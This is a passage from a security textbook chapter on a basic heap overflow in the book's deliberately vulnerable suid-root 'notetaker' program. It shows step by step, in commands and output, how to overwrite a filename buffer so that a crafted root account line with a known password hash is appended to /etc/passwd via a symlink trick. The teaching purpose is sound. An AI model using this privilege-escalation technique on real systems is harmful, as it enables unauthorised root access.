<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x341  A Basic Heap-Based Overflow</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part58.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part60.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark49">0x341  A Basic Heap-Based Overflow</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">The notetaker program from Chapter 2 is also susceptible to a buffer over- flow vulnerability. Two buffers are allocated on the heap, and the first command-line argument is copied into the first buffer. An overflow can occur here.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">Excerpt from notetaker.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_441.png"/></span></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">buffer = (char *) ec_malloc(100); datafile = (char *) ec_malloc(20); strcpy(datafile, &quot;/var/notes&quot;);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 116pt;text-indent: -12pt;line-height: 107%;text-align: left;">if(argc &lt; 2)       // If there aren&#39;t command-line arguments, usage(argv[0], datafile); // display usage message and exit.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">strcpy(buffer, argv[1]); // Copy into buffer.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-bottom: 2pt;padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">printf(&quot;[DEBUG] buffer  @ %p: \&#39;%s\&#39;\n&quot;, buffer, buffer); printf(&quot;[DEBUG] datafile @ %p: \&#39;%s\&#39;\n&quot;, datafile, datafile);</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_442.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Under normal conditions, the buffer allocation is located at <span class="s31">0x804a008</span>, which is before the <span class="s31">datafile </span>allocation at <span class="s31">0x804a070</span>, as the debugging output shows. The distance between these two addresses is 104 bytes.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_443.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ ./notetaker test [DEBUG] buffer  @ 0x804a008: &#39;test&#39; [DEBUG] datafile @ 0x804a070: &#39;/var/notes&#39; [DEBUG] file descriptor is 3</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Note has been saved. reader@hacking:~/booksrc $ gdb -q (gdb) p 0x804a070 - 0x804a008</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">$1 = 104</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) quit reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_444.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Since the first buffer is null terminated, the maximum amount of data that can be put into this buffer without overflowing into the next should be 104 bytes.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_445.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./notetaker $(perl -e &#39;print &quot;A&quot;x104&#39;)</p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">[DEBUG] buffer  @ 0x804a008: &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[DEBUG] datafile @ 0x804a070: &#39;&#39;</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[!!] Fatal Error in main() while opening file: No such file or directory reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_446.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">As predicted, when 104 bytes are tried, the null-termination byte over- flows into the beginning of the <span class="s31">datafile </span>buffer. This causes the <span class="s31">datafile </span>to be nothing but a single null byte, which obviously cannot be opened as a file. But what if the <span class="s31">datafile </span>buffer is overwritten with something more than just a null byte?</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_447.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./notetaker $(perl -e &#39;print &quot;A&quot;x104 . &quot;testfile&quot;&#39;)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[DEBUG] buffer @ 0x804a008: &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtestfile&#39;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[DEBUG] datafile @ 0x804a070: &#39;testfile&#39; [DEBUG] file descriptor is 3</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Note has been saved.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">*** glibc detected *** ./notetaker: free(): invalid next size (normal): 0x0804a008 ***</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">======= Backtrace: =========</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">/lib/tls/i686/cmov/libc.so.6[0xb7f017cd]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">/lib/tls/i686/cmov/libc.so.6(cfree+0x90)[0xb7f04e30]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">./notetaker[0x8048916]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">/lib/tls/i686/cmov/libc.so.6(<u> </u>libc_start_main+0xdc)[0xb7eafebc]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">./notetaker[0x8048511]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">======= Memory map: ========</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">08048000-08049000 r-xp 00000000 00:0f 44384   /cow/home/reader/booksrc/notetaker</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">08049000-0804a000 rw-p 00000000 00:0f 44384   /cow/home/reader/booksrc/notetaker</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0804a000-0806b000 rw-p 0804a000 00:00 0     [heap]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">b7d00000-b7d21000 rw-p b7d00000 00:00 0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">b7d21000-b7e00000 ---p b7d21000 00:00 0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">b7e83000-b7e8e000 r-xp 00000000 07:00 15444   /rofs/lib/libgcc_s.so.1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">b7e8e000-b7e8f000 rw-p 0000a000 07:00 15444   /rofs/lib/libgcc_s.so.1</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">b7e99000-b7e9a000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">b7e99000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0</p></td><td style="width:164pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">b7e9a000-b7fd5000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">r-xp</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">00000000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">07:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">15795</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 9pt;text-align: left;">/rofs/lib/tls/i686/cmov/libc-2.5.so</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">b7fd5000-b7fd6000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">r--p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0013b000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">07:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">15795</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/rofs/lib/tls/i686/cmov/libc-2.5.so</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">b7fd6000-b7fd8000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">0013c000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">07:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">15795</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/rofs/lib/tls/i686/cmov/libc-2.5.so</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">b7fd8000-b7fdb000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">b7fd8000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0</p></td><td style="width:164pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">b7fe4000-b7fe7000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">b7fe4000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0</p></td><td style="width:164pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">b7fe7000-b8000000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">r-xp</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">00000000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">07:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">15421</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/rofs/lib/ld-2.5.so</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">b8000000-b8002000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: center;">00019000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">07:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">15421</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/rofs/lib/ld-2.5.so</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">bffeb000-c0000000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">rw-p</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">bffeb000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[stack]</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ffffe000-fffff000</p></td><td style="width:21pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">r-xp</p></td><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: center;">00000000</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00:00</p></td><td style="width:36pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0</p></td><td style="width:164pt"><p class="s42" style="padding-left: 13pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[vdso]</p></td></tr><tr style="height:10pt"><td style="width:77pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Aborted</p></td><td style="width:21pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:38pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:26pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:36pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:164pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p class="s31" style="padding-top: 1pt;padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_448.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">This time, the overflow is designed to overwrite the <span class="s31">datafile </span>buffer with the string <span class="s27">testfile</span>. This causes the program to write to testfile instead of</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">/var/notes, as it was originally programmed to do. However, when the heap memory is freed by the <span class="s31">free() </span>command, errors in the heap headers are detected and the program is terminated. Similar to the return address overwrite with stack overflows, there are control points within the heap architecture itself. The most recent version of glibc uses heap memory management functions that have evolved specifically to counter heap unlinking attacks. Since version 2.2.5, these functions have been rewritten to print debugging information and terminate the program when they detect problems with the heap header information. This makes heap unlinking in Linux very difficult. However, this particular exploit doesn’t use heap header information to do its magic, so by the time <span class="s31">free() </span>is called, the program has already been tricked into writing to a new file with root privileges.</p><p style="text-indent: 0pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_449.png"/></span></p><p class="s31" style="padding-left: 32pt;text-indent: -12pt;line-height: 21pt;text-align: left;">reader@hacking:~/booksrc $ grep -B10 free notetaker.c if(write(fd, buffer, strlen(buffer)) == -1) // Write note.</p><p class="s31" style="padding-left: 32pt;text-indent: 12pt;line-height: 107%;text-align: left;">fatal(&quot;in main() while writing buffer to file&quot;); write(fd, &quot;\n&quot;, 1); // Terminate line.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: -12pt;text-align: left;">// Closing file if(close(fd) == -1)</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">fatal(&quot;in main() while closing file&quot;);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">printf(&quot;Note has been saved.\n&quot;); free(buffer);</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">free(datafile);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ls -l ./testfile</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">-rw------- 1 root reader 118 2007-09-09 16:19 ./testfile reader@hacking:~/booksrc $ cat ./testfile</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">cat: ./testfile: Permission denied reader@hacking:~/booksrc $ sudo cat ./testfile</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 9pt;text-align: left;">AAAAAAAAAtestfile</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_450.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">A string is read until a null byte is encountered, so the entire string is written to the file as the <span class="s31">userinput</span>. Since this is a suid root program, the file that is created is owned by root. This also means that since the filename can be controlled, data can be appended to any file. This data does have some restrictions, though; it must end with the controlled filename, and a line with the user ID will be written, also.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">There are probably several clever ways to exploit this type of capability. The most apparent one would be to append something to the /etc/passwd file. This file contains all of the usernames, IDs, and login shells for all the users of the system. Naturally, this is a critical system file, so it is a good idea to make a backup copy before messing with it too much.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_451.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ cp /etc/passwd /tmp/passwd.bkup reader@hacking:~/booksrc $ head /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh reader@hacking:~/booksrc  $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_452.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 106%;text-align: left;">The fields in the /etc/passwd file are delimited by colons, the first field being for login name, then password, user ID, group ID, username, home directory, and finally the login shell. The password fields are all filled with the <span class="s27">x </span>character, since the encrypted passwords are stored elsewhere in a shadow file. (However, this field can contain the encrypted password.)</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">In addition, any entry in the password file that has a user ID of 0 will be given root privileges. That means the goal is to append an extra entry with both root privileges and a known password to the password file.</p><p style="padding-left: 109pt;text-indent: 0pt;line-height: 11pt;text-align: left;">The password can be encrypted using a one-way hashing algorithm.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">Because the algorithm is one way, the original password cannot be recreated from the hash value. To prevent lookup attacks, the algorithm uses a <span class="s27">salt value</span>, which when varied creates a different hash value for the same input password. This is a common operation, and Perl has a <span class="s31">crypt() </span>function that performs it. The first argument is the password, and the second is the salt value. The same password with a different salt produces a different salt.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_453.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ perl -e &#39;print crypt(&quot;password&quot;, &quot;AA&quot;). &quot;\n&quot;&#39;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">AA6tQYSfGxd/A</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ perl -e &#39;print crypt(&quot;password&quot;, &quot;XX&quot;). &quot;\n&quot;&#39;</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">XXq2wKiyI43A2 reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_454.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Notice that the salt value is always at the beginning of the hash. When a user logs in and enters a password, the system looks up the encrypted password</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">for that user. Using the salt value from the stored encrypted password, the system uses the same one-way hashing algorithm to encrypt whatever text the user typed as the password. Finally, the system compares the two hashes; if they are the same, the user must have entered the correct password. This allows the password to be used for authentication without requiring that the password be stored anywhere on the system.</p><p style="padding-left: 91pt;text-indent: 17pt;text-align: justify;">Using one of these hashes in the password field will make the password for the account be <span class="s27">password</span>, regardless of the salt value used. The line to append to /etc/passwd should look something like this:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_455.png"/></span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">myroot:XXq2wKiyI43A2:0:0:me:/root:/bin/bash</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_456.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">However, the nature of this particular heap overflow exploit won’t allow that exact line to be written to /etc/passwd, because the string must end with</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">/etc/passwd. However, if that filename is merely appended to the end of the entry, the passwd file entry would be incorrect. This can be compensated for with the clever use of a symbolic file link, so the entry can both end with</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 11pt;text-align: left;">/etc/passwd and still be a valid line in the password file. Here’s how it works:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_457.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ mkdir /tmp/etc reader@hacking:~/booksrc $ ln -s /bin/bash /tmp/etc/passwd reader@hacking:~/booksrc $ ls -l /tmp/etc/passwd</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">lrwxrwxrwx 1 reader reader 9 2007-09-09 16:25 /tmp/etc/passwd -&gt; /bin/bash reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_458.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Now /tmp/etc/passwd points to the login shell /bin/bash. This means that a valid login shell for the password file is also /tmp/etc/passwd, making the following a valid password file line:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_459.png"/></span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">myroot:XXq2wKiyI43A2:0:0:me:/root:/tmp/etc/passwd</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_460.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The values of this line just need to be slightly modified so that the portion before /etc/passwd is exactly 104 bytes long:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_461.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ perl -e &#39;print &quot;myroot:XXq2wKiyI43A2:0:0:me:/root:/tmp&quot;&#39; | wc -c 38</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">reader@hacking:~/booksrc $ perl -e &#39;print &quot;myroot:XXq2wKiyI43A2:0:0:&quot; . &quot;A&quot;x50 . &quot;:/root:/tmp&quot;&#39;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">| wc -c 86</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q (gdb) p 104 - 86 + 50</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 68</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) quit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">reader@hacking:~/booksrc $ <b>perl -e &#39;print &quot;myroot:XXq2wKiyI43A2:0:0:&quot; . &quot;A&quot;x68 . &quot;:/root:/tmp&quot;&#39;</b></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">| wc -c 104</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_462.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">If /etc/passwd is added to the end of that final string (shown in bold), the string above will be appended to the end of the /etc/passwd file. And since this line defines an account with root privileges with a password we set, it won’t</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: 